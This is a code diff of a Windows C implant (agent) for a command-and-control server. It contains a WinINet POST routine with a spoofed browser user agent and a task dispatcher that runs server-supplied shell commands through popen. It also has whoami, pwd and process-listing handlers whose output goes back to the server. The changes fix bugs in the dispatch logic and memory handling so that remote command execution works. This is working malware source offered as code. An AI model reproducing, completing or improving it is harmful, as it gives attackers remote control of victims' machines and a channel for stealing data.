@@ -1,14 +1,18 @@
-#include <stdlib.h>
-#include <stdint.h>
-#include <windows.h>
-#include <wininet.h>
+// C std libs
 #include <stdbool.h>
+#include <stdint.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
+
+// windows.h and friends
+#include <windows.h>
 #include <tlhelp32.h>
+#include <wininet.h>
+
+// other libs
 #include "cJSON.h"
-
-
+#include "base64.h"
 
 char* handle_shell_cmd(cJSON *task);
 void dispatcher(cJSON *task);
@@ -73,23 +77,29 @@ implant_config config = {
     .proxy_pass = "REPLACE_ME_PROXY_PASS", //
     .killdate = "REPLACE_ME_KILLDATE" //
 };
-
+//char* build_message(char* json){
+//    size_t json_len = strlen(json);
+//    size_t encoded_len = (4 * ((json_len + 2) / 3)) + 1;
+//    char* encoded_msg = (char*)malloc(encoded_len);
+//    
+//
+//}
 char* send_c2_post_request(char* json_data) {
     HINTERNET hInternet = InternetOpen("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!hInternet) return "";
+    if (!hInternet) return NULL;
 
     HINTERNET hConnect = InternetConnect(hInternet, config.host, config.port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-    if (!hConnect) { InternetCloseHandle(hInternet); return ""; }
+    if (!hConnect) { InternetCloseHandle(hInternet); return NULL; }
 
     HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", config.post_uri, NULL, NULL, NULL, INTERNET_FLAG_NO_CACHE_WRITE, 0);
-    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return ""; }
+    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return NULL; }
 
     const char* headers = "Content-Type: application/json\r\n";
     
     if (HttpSendRequest(hRequest, headers, -1, json_data, strlen(json_data))) {
         printf("wysłano post'a\n");
         
-        char buffer[1024];
+        char buffer[12000];
         DWORD bytesRead;
         if (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead)) {
             char* response = (char*)malloc(bytesRead+1);
@@ -137,6 +147,7 @@ cJSON_ArrayForEach(task,tasks){
                        }
 
                  }
+free(tasks_json);
 cJSON_Delete(root);
 return;
               }
@@ -153,9 +164,9 @@ char* handle_shell_cmd(cJSON *task){
      FILE *fp;
      char *command = cJSON_GetObjectItemCaseSensitive(task, "parameters")->valuestring;
      char output[512];
-
+size_t read;
      fp = popen(command,"r"); 
-        size_t read = fread(output,512,1,fp);
+         read = fread(output, 1, 512, fp);
     fclose(fp);
 
 char* ret_val = (char*)malloc(read+1);
@@ -201,19 +212,19 @@ char* handle_whoami_cmd(/*cJSON *task*/){
 
 void dispatcher(cJSON *task){
     char* command_output;
-    if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"shell")){
+    if (!(strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"shell"))){
         command_output = handle_shell_cmd(task);
     }
-    else if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"pwd")){
+    else if (!(strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"pwd"))){
          command_output = handle_pwd_cmd(task);
 
     }
-    else if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"whoami")){
+    else if (!(strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"whoami"))){
          command_output = handle_whoami_cmd(task);
     }
-    else if (strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"ps")){
+    else if (!(strcmp(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring,"ps"))){
          handle_ps_cmd(task);
-
+         return;
     } else{
         printf(":( unknown command:\n");
             puts(cJSON_GetObjectItemCaseSensitive(task, "cmd")->valuestring);
@@ -223,17 +234,19 @@ void dispatcher(cJSON *task){
         cJSON_AddStringToObject(root,"action","post_response");
         cJSON *arr = cJSON_CreateArray();
         cJSON_AddItemToObject(root,"responses",arr);
-        
+                
             cJSON *obj1 = cJSON_CreateObject();
             cJSON_AddStringToObject(obj1,"task_id",cJSON_GetObjectItemCaseSensitive(task,"id")->valuestring);
             cJSON_AddStringToObject(obj1,"user_output",command_output);
+        cJSON_AddBoolToObject(obj1, "completed", 1);
+
             cJSON_AddItemToArray(arr,obj1);
 
         char* command_executed = cJSON_PrintUnformatted(root);
         send_c2_post_request(command_executed);
         free(command_executed);
         free(command_output);
-        free(root);
+        cJSON_Delete(root);
     
 
     
@@ -296,6 +309,7 @@ void handle_ps_cmd(cJSON *task){
 
 cJSON *statusik = cJSON_GetObjectItemCaseSensitive(obj,"status");
 cJSON_SetValuestring(statusik,"success");
+cJSON_AddBoolToObject(obj,"completed",1);
 //cJSON_DeleteItemFromObject(cJSON_GetObjectItemCaseSensitive(obj,"user_output"),);
 char* unformatted_buff = cJSON_PrintUnformatted(root);
 send_c2_post_request(unformatted_buff);
